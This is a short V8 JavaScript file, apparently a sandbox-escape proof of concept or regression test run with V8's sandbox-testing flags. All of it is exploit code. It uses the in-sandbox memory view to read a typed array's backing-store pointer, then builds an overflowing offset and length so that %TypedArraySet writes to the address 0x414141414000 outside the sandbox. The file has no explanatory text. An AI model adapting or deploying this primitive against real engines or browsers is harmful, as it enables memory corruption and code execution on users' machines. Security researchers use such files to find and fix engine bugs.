// Flags: --sandbox-testing --allow-natives-syntax

const kHeapObjectTag = 1;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
    return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
    return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
    memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let ta1 = new Uint16Array(0x10);
let ta2 = new Uint32Array(0x10);

let buf = getPtr(ta1.buffer);
let membase =
    (BigInt(getField(buf, 36)) >> 24n) | (BigInt(getField(buf, 40)) << 8n);
membase += BigInt(Sandbox.base);

let offset = (0x414141414000n - membase) / 2n + (1n << 63n);
let length = (1n << 64n) - offset;

%TypedArraySet(ta1, ta2, Number(length), Number(offset));
